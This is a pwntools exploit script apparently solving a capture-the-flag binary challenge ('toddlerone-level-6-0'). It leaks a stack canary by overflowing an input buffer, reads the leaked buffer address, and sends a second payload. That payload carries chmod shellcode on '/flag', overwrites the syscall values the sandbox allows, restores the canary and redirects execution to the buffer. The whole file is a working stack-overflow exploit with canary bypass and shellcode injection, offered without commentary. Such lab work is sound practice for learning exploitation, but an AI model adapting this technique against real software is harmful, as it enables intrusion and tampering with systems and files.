from pwn import *

buff_offset = int("88", 16)
can_offset = int("20", 16)

# Value of syscalls that are not blocked
offset1 = int("38", 16)
offset2 = int("30", 16)

# We want to chmod the flag
val1 = b"\x00\x00\x00\x00\x5a\x00\x00\x00"  # chmod
val2 = b"\x01\x00\x00\x00\x00\x00\x00\x00"  # write

context.arch = 'amd64'

elf = ELF("/challenge/toddlerone-level-6-0")
io = elf.process()

# First round
k = b"REPEAT"
p1 = k + b'A'*(buff_offset - len(k) - can_offset + 1)

io.sendline(f"{len(p1)}")
io.sendline(p1)

io.recvuntil(p1)
can = io.recvuntil(b'\n')
can = b'\x00' + can[:7]

io.recvuntil("The input buffer begins at 0x")
buff_add = io.recvuntil(b',')
eff_add = p64(int(buff_add[:12], 16))
sc_add = p64(int(buff_add[:12], 16) + buff_offset + 8)

# Chmod chellcode
shellcode = asm(shellcraft.chmod("/flag", 0o777))

# Forge payload
p2 = shellcode + b'A'*(buff_offset - len(shellcode) - offset1) + val1 + val2 + b'C'*(offset2 - 8 - can_offset) + can + b'B'*(can_offset - 8) + eff_add

# Second round
io.sendline(f"{len(p2)}")
io.sendline(p2)

io.interactive()

# Now flag should be cat-able
